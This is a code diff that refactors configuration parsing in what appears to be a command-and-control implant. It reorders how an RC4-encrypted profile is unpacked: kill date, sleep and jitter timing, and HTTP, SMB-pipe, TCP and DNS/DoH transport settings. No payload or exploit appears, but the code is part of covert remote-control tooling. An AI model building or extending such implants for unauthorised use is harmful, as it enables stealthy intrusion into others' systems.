@@ -30,26 +30,32 @@ AgentConfig::AgentConfig()
 
 	DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, 16);
 	
-	this->agent_type = packer->Unpack32();
-	
+	this->agent_type   = packer->Unpack32();
+	this->kill_date    = packer->Unpack32();
+	this->working_time = packer->Unpack32();
+	this->sleep_delay  = packer->Unpack32();
+	this->jitter_delay = packer->Unpack32();
+
 #if defined(BEACON_HTTP)
-	this->profile.use_ssl       = packer->Unpack8();
-	this->profile.servers_count = packer->Unpack32();
-	this->profile.servers       = (BYTE**) MemAllocLocal(this->profile.servers_count * sizeof(LPVOID) );
-	this->profile.ports         = (WORD*)  MemAllocLocal(this->profile.servers_count * sizeof(WORD) );
+	this->listener_type = packer->Unpack32();
+
+	this->profile.use_ssl        = packer->Unpack8();
+	this->profile.servers_count  = packer->Unpack32();
+	this->profile.servers        = (BYTE**) MemAllocLocal(this->profile.servers_count * sizeof(LPVOID) );
+	this->profile.ports          = (WORD*)  MemAllocLocal(this->profile.servers_count * sizeof(WORD) );
 	for (int i = 0; i < this->profile.servers_count; i++) {
 		this->profile.servers[i] = packer->UnpackBytesCopy(&length);
 		this->profile.ports[i]   = (WORD) packer->Unpack32();
 	}
-	this->profile.http_method  = packer->UnpackBytesCopy(&length);
-	this->profile.uri_count    = packer->Unpack32();
-	this->profile.uris         = (BYTE**) MemAllocLocal(this->profile.uri_count * sizeof(LPVOID));
+	this->profile.http_method = packer->UnpackBytesCopy(&length);
+	this->profile.uri_count   = packer->Unpack32();
+	this->profile.uris        = (BYTE**)MemAllocLocal(this->profile.uri_count * sizeof(LPVOID));
 	for (ULONG i = 0; i < this->profile.uri_count; i++) {
 		this->profile.uris[i] = packer->UnpackBytesCopy(&length);
 	}
-	this->profile.parameter    = packer->UnpackBytesCopy(&length);
-	this->profile.ua_count     = packer->Unpack32();
-	this->profile.user_agents  = (BYTE**) MemAllocLocal(this->profile.ua_count * sizeof(LPVOID));
+	this->profile.parameter   = packer->UnpackBytesCopy(&length);
+	this->profile.ua_count    = packer->Unpack32();
+	this->profile.user_agents = (BYTE**)MemAllocLocal(this->profile.ua_count * sizeof(LPVOID));
 	for (ULONG i = 0; i < this->profile.ua_count; i++) {
 		this->profile.user_agents[i] = packer->UnpackBytesCopy(&length);
 	}
@@ -57,43 +63,28 @@ AgentConfig::AgentConfig()
 	this->profile.ans_pre_size = packer->Unpack32();
 	this->profile.ans_size     = packer->Unpack32() + this->profile.ans_pre_size;
 	this->profile.hh_count     = packer->Unpack32();
-	this->profile.host_headers = (BYTE**) MemAllocLocal(this->profile.hh_count * sizeof(LPVOID));
+	this->profile.host_headers = (BYTE**)MemAllocLocal(this->profile.hh_count * sizeof(LPVOID));
 	for (ULONG i = 0; i < this->profile.hh_count; i++) {
 		this->profile.host_headers[i] = packer->UnpackBytesCopy(&length);
 	}
-	this->profile.rotation_mode = (BYTE) packer->Unpack32();
-
+	this->profile.rotation_mode  = (BYTE) packer->Unpack32();
 	this->profile.proxy_type     = (BYTE) packer->Unpack32();
 	this->profile.proxy_host     = packer->UnpackBytesCopy(&length);
 	this->profile.proxy_port     = (WORD) packer->Unpack32();
 	this->profile.proxy_username = packer->UnpackBytesCopy(&length);
 	this->profile.proxy_password = packer->UnpackBytesCopy(&length);
 
-	this->listener_type = 0;
-
-	this->kill_date    = packer->Unpack32();
-	this->working_time = packer->Unpack32();
-	this->sleep_delay  = packer->Unpack32();
-	this->jitter_delay = packer->Unpack32();
-
 #elif defined(BEACON_SMB)
-	this->profile.pipename = packer->UnpackBytesCopy(&length);
 	this->listener_type    = packer->Unpack32();
-	this->kill_date        = packer->Unpack32();
-	this->working_time     = 0;
-	this->sleep_delay      = 0;
-	this->jitter_delay     = 0;
+	this->profile.pipename = packer->UnpackBytesCopy(&length);
 
 #elif defined(BEACON_TCP)
+	this->listener_type   = packer->Unpack32();
 	this->profile.prepend = packer->UnpackBytesCopy(&length);
 	this->profile.port    = packer->Unpack32();
-	this->listener_type   = packer->Unpack32();
-	this->kill_date       = packer->Unpack32();
-	this->working_time    = 0;
-	this->sleep_delay     = 0;
-	this->jitter_delay    = 0;
 
 #elif defined(BEACON_DNS)
+	this->listener_type         = packer->Unpack32();
 	this->profile.domain        = packer->UnpackBytesCopy(&length);
 	this->profile.resolvers     = packer->UnpackBytesCopy(&length);
 	this->profile.doh_resolvers = packer->UnpackBytesCopy(&length);
@@ -107,13 +98,6 @@ AgentConfig::AgentConfig()
 	this->profile.burst_jitter  = packer->Unpack32();
 	this->profile.dns_mode      = packer->Unpack32();
 	this->profile.user_agent    = packer->UnpackBytesCopy(&length);
-
-	this->listener_type = packer->Unpack32();
-	this->kill_date     = packer->Unpack32();
-	this->working_time  = packer->Unpack32();
-	this->sleep_delay   = packer->Unpack32();
-	this->jitter_delay  = packer->Unpack32();
-
 #endif
 
 #if defined(BEACON_DNS)
